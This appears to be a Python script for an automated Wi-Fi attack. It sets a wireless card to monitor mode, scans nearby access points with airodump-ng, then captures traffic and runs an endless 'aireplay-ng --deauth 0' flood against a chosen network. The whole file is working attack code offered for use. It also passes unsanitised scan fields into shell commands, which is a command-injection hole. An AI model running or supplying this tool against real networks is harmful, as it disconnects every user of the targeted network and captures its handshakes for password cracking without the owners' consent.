import os
import netifaces
import subprocess
import csv
import time
from termcolor import colored
from cmd import Cmd
class Term(Cmd):
    prompt = "[*] "
    def default(self, args):
        return args
    def do_exit(self, args):
        return True
def display_network_interfaces():
    interfaces = netifaces.interfaces()
    for index, interface in enumerate(interfaces, start=1):
        interface_name = f"[{index}] {interface}"
        colored_interface_name = colored(interface_name, 'green')
        print(colored_interface_name)

def print_network_details(csv_file):
    networks = []
    with open(csv_file, 'r') as file:
        reader = csv.reader(file)
        for row in reader:
            if len(row) >= 14:  # Ensure the row has enough columns
                bssid = row[0].strip()
                channel = row[3].strip()
                essid = row[13].strip()
                network_info = f"Network: BSSID: {bssid}, Channel: {channel}, ESSID: {essid}"
                networks.append((bssid, channel, essid))

    if networks:
        print("Choose a network to proceed:")
        for index, network in enumerate(networks, start=1):
            bssid, channel, essid = network
            network_choice = f"[{index}] BSSID: {bssid}, Channel: {channel}, ESSID: {essid}"
            colored_network_choice = colored(network_choice, 'yellow')
            print(colored_network_choice)

    while True:
        try:
            user_input = int(input("[*] "))
            choice = user_input
            if 1 <= choice <= len(networks):
                selected_network = networks[choice - 1]
                bssid, channel, essid = selected_network
                print(f"You selected: BSSID: {bssid}, Channel: {channel}, ESSID: {essid}")
                chosen_interface = get_chosen_interface()
                execute_airodump(chosen_interface, bssid, channel)
                execute_aireplay(chosen_interface, bssid)
                break
            else:
                print(colored("Invalid choice!", 'red'))
        except EOFError:
            print(colored("Input interrupted. Please provide input again.", 'red'))

def get_chosen_interface():
    print(colored(display_network_interfaces(), 'red'))
    while True:
        term = Term()
        user_input = input(term.prompt)
        if user_input.isdigit():
            choice = int(user_input)
            interfaces = netifaces.interfaces()
            if 1 <= choice <= len(interfaces):
                chosen_interface = interfaces[choice - 1]
                print(f"Chosen interface: {chosen_interface}")
                return chosen_interface
            else:
                print(colored("Invalid choice!", 'red'))
        else:
            print(colored("Invalid input!", 'red'))

def execute_airodump(interface, bssid, channel):
    command = f"xterm -e 'airodump-ng --bssid {bssid} --channel {channel} {interface}'"
    subprocess.Popen(command, shell=True)
def execute_aireplay(interface, bssid):
    command = f"xterm -e 'aireplay-ng --deauth 0 -a {bssid}  {interface}'"
    subprocess.Popen(command, shell=True)

def execute_command(command, timeout=None):
    try:
        output = subprocess.check_output(command, stderr=subprocess.STDOUT, timeout=timeout, shell=True)
        return output.decode(), None
    except subprocess.CalledProcessError as e:
        return None, e.output.decode()
    except subprocess.TimeoutExpired:
        return None, "Command execution timed out."

def Check_if_root():
    root = os.geteuid()
    if root != 0:
        print(colored("You Must Run The Tool As Root!", 'red'))
        exit()
    else:
        os.system("clear && neofetch")
        print(colored("[--- Hello there, user! Please choose an interface: ---]\n", 'blue'))
        display_network_interfaces()
        print('')
        while True:
            try:
                term = Term()
                user_input = input(term.prompt)
                if user_input == "exit":
                    print(colored("Exiting the Program", "red"))
                    os.system("rm -rf *.cap *.csv *.netxml")
                    break
                elif user_input.isdigit():
                    choice = int(user_input)
                    interfaces = netifaces.interfaces()
                    if 1 <= choice <= len(interfaces):
                        chosen_interface = interfaces[choice - 1]
                        colored_chosen_interface = colored(chosen_interface, 'yellow')
                        print(f"Okay, choosing {colored_chosen_interface}")
                        time.sleep(2)
                        os.system("clear")
                        print('')
                        print(colored("Now Setting up the Interface for the Attack", 'green'))
                        os.system(f"nmcli device disconnect {chosen_interface} && ifconfig {chosen_interface} down && iwconfig {chosen_interface} mode monitor && ifconfig {chosen_interface} up")
                        print(colored("Done!", "green"))
                        time.sleep(2)
                        os.system("clear")
                        print(colored("Please, wait a few seconds for the scan to finish", "green"))
                        execute_command(f"airodump-ng {chosen_interface} --write out", timeout=15)
                        csv_file = "out-01.csv"
                        print_network_details(csv_file)
                        #execute_airodump(chosen_interface, bssid, channel)
                        #execute_aireplay(chosen_interface, bssid)
                    else:
                        print(colored("Invalid choice!", 'red'))
                else:
                    print(colored("Invalid input!", 'red'))
            except EOFError:
                print(colored("Input interrupted. Please provide input again.", 'red'))

def main():
    Check_if_root()

if __name__ == '__main__':
    main()
